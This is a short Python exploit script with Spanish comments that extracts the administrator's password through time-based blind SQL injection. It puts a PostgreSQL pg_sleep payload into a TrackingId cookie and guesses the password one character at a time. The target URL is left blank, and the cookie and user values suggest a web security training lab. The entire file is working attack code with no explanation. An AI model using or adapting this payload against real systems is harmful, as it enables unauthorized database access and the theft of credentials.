#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(dig, frame):
        print("\n\n[-]Saliendo...")
        sys.exit(1)
#ctrl+C
signal.signal(signal.SIGINT, def_handler)

main_url = ""
characters = string.ascii_lowercase + string.digits

def makeRequest():

        password = ""

        p1 = log.progress("fuerza bruta")
        p1.status ("Iniciando ataque de fuerza bruta")

        time.sleep(2)

        p2 = log.progress("Password: ")

        for position in range (1, 21):
                for character in characters:
                        cookies = {'TrackingId': "92FaR11mJkD74mou' || (select case when substring(password,%d,1)='%s' then pg_sleep(2) else pg_sleep(0) end from users where username='administrator')-- -" % (position, character), 'session': 'OONEXeZWEH1LFYg3cCsHG9FBtLGy3XyP'}

                        p1.status(cookies['TrackingId'])

                        time_start = time.time()
                        r = requests.get(main_url, cookies=cookies)
                        time_end = time.time()

                        if time_end - time_start > 2:
                                password += character
                                p2.status(password)
                                break

if __name__ == '__main__':
        makeRequest()
